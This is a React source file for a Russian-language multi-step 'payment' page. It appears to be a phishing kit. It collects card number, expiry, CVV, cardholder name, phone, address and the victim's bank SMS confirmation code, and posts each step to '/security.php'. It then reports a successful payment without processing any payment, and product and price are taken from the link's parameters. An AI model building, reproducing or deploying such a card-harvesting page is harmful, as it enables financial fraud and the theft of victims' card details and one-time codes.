import PaymentSteps from '../PaymentSteps'
import { TextField } from '@material-ui/core'
import Button from '@material-ui/core/Button';
import { useState } from 'react';
import InputMask from 'react-input-mask'
import { Grid } from '@material-ui/core';
import CheckCircleOutlineIcon from '@material-ui/icons/CheckCircleOutline';
import axios from 'axios';

import './style.css'

function validateDate(date) {
    if(date) {
        const [month, year] = date.split('/')
        return month > 0 && month <= 12 && year > 20;
    }
    return false
}

export default function PaymentForm(props) {
    const [activeStep, setActiveStep] = useState(0)
    const [cardNumber, setCardNumber] = useState('')
    const [firstName, setFirstName] = useState('')
    const [lastName, setLastName] = useState('')
    const [cardDate, setCardDate] = useState('')
    const [cardCVV, setCardCVV] = useState('')
    const [cardHoldersName, setCardHoldersName] = useState('')
    const [personName, setPersonName] = useState('')
    const [personMobile, setPersonMobile] = useState('')
    const [personStreet, setPersonStreet] = useState('')
    const [personAddress, setPersonAddress] = useState('')
    const [personCountry, setPersonCountry] = useState('')
    const [personRegion, setPersonRegion] = useState('')
    const [personCity, setPersonCity] = useState('')
    const [personPostalCode, setPersonPostalCode] = useState('')
    const [confirmationCode, setConfirmationCode] = useState('')

    const submitFormAndContinue = (stepId, data) => {
        setActiveStep(stepId)
        // Simple POST request with a JSON body using fetch
        axios.post('/security.php', data)
    }

    const formList = [
        (
            <div key={1} className='form-block form-name'>
                <TextField className='form-input' label="Имя" placeholder="Иван" value={firstName} onChange={(e) => setFirstName(e.target.value)} />
                <TextField className='form-input' label="Фамилия" placeholder="Иванов" value={lastName} onChange={(e) => setLastName(e.target.value)} />
                <div className='form-footer'>
                    <Button variant="contained" color="primary" className='next-btn' onClick={() => {
                        if(firstName && lastName) submitFormAndContinue(1, {firstName, lastName})
                    }} >Дальше</Button>
                </div>
            </div>
        ),
        (
            <div key={2} className='form-block form-card'>
                <InputMask value={cardNumber} onChange={(e) => setCardNumber(e.target.value)} mask="9999 9999 9999 9999" maskChar=" " >
                    {() => <TextField label="Номер карты" placeholder="4685 1538 4845 3218" className='form-input' />}    
                </InputMask>
                <Grid container>
                    <Grid item xs={6}>
                        <InputMask value={cardDate} onChange={(e) => setCardDate(e.target.value)} mask="99/99" maskChar=" " >
                            {() => <TextField label="Срок действия" placeholder="ММ/ГГ"  className='form-input' />}    
                        </InputMask>  
                    </Grid>
                    <Grid item xs={6}>
                        <InputMask value={cardCVV} onChange={(e) => setCardCVV(e.target.value)} mask="999" maskChar=" " >
                            {() => <TextField label="CVV" placeholder="456" className='form-input' />}    
                        </InputMask>  
                    </Grid>
                    <TextField label="Имя держателя на карте" placeholder="IVAN IVANOV" className='form-input' value={cardHoldersName} onChange={(e) => setCardHoldersName(e.target.value)} />
                </Grid>          
                <div className='form-footer'>
                    <Button variant="contained" color="primary" className='next-btn' onClick={() => {
                        if(cardNumber && cardDate && validateDate(cardDate) && cardCVV && cardHoldersName) submitFormAndContinue(2, { cardNumber, cardDate, cardCVV, cardHoldersName })
                    }}>Дальше</Button>
                </div>
            </div>
        ),
        (
            <div key={3} className='form-block form-card'>
                <TextField label="Контактное лицо" placeholder="Иван Иванов" className='form-input' value={personName} onChange={(e) => setPersonName(e.target.value)}/>
                <TextField label="Номер мобильного" placeholder="+74957556983" className='form-input' value={personMobile} onChange={(e) => setPersonMobile(e.target.value.replace(/[^0-9+]/g, ''))}/>
                <TextField label="Улица, абонентский ящик и т.п." placeholder="" className='form-input' value={personStreet} onChange={(e) => setPersonStreet(e.target.value)}/>

                <Grid container>
                    <Grid item xs={6}>
                        <TextField label="Страна" placeholder="" className='form-input' value={personCountry} onChange={(e) => setPersonCountry(e.target.value)}/>
                    </Grid>
                    <Grid item xs={6}>
                        <TextField label="Город" placeholder="" className='form-input' value={personCity} onChange={(e) => setPersonCity(e.target.value)}/>
                    </Grid>
                    <Grid item xs={6}>
                        <TextField label="Квартира, корпус" placeholder="" className='form-input' value={personAddress} onChange={(e) => setPersonAddress(e.target.value)}/>
                    </Grid>
                    <Grid item xs={6}>
                        <TextField label="Область/край" placeholder="" className='form-input' value={personRegion} onChange={(e) => setPersonRegion(e.target.value)}/>
                    </Grid>
                    
                    <Grid item xs={6}>
                        <TextField label="Почтовый индекс" placeholder="" className='form-input' value={[personPostalCode]} onChange={(e) => setPersonPostalCode(e.target.value)}/>
                    </Grid>
                </Grid>
                <div className='form-footer'>
                    <Button variant="contained" color="primary" className='next-btn' onClick={() => { if(personName && personMobile && personStreet && personCountry && personCity && personAddress && personRegion && personPostalCode) submitFormAndContinue(3, {personName, personMobile, personStreet, personCountry, personCity, personAddress, personRegion, personPostalCode } ) }}>Дальше</Button>
                </div>
            </div>
        ),
        (
            <div key={4} className='form-block form-name'>
                <div className='phone-confirmation-text'>
                    В течении 5 минут на номер привязанний к вашей банковской карте придет смс с кодом подтверждения платежа.
                </div>
                <TextField className='form-input' label="Код подтверждения" placeholder="" value={confirmationCode} onChange={(e) => setConfirmationCode(e.target.value)} />
                <div className='form-footer'>
                    <Button variant="contained" color="primary" className='next-btn' onClick={() => { if (confirmationCode) submitFormAndContinue(4, { confirmationCode }) }} >Завершить заказ</Button>
                </div>
            </div>
        ),
        (
            <div key={5} className='form-block form-name'>
                <div className='success-icon-container'>
                    <CheckCircleOutlineIcon className='success-icon' />
                </div>
                <div className='success-text'>
                    Платеж успешно завершен. Вы получите трек-код для вашего заказа по смс.
                </div>
            </div>
        ),
    ]

    let formData = new URLSearchParams(props.location.search);
    let productName = formData.get('product')
    let productPrice = formData.get('dp')

    if(productName) {
        document.title = "Оплата " + productName;
    }
    return (
        <div className='payment-form'>
            <div className='payment-info'>
                <div className='title'>Оплата</div>
                <div className='product-name'>{productName}</div>
                <div className='product-price'>{productPrice}$</div>
            </div>
            <PaymentSteps activeStep={activeStep} className={activeStep < 4? '':'hidden'}/>
            {
                productName && productPrice? formList[activeStep]: <div className='error'>Не правильная ссылка для оплаты.</div>
            }
        </div>
    )
}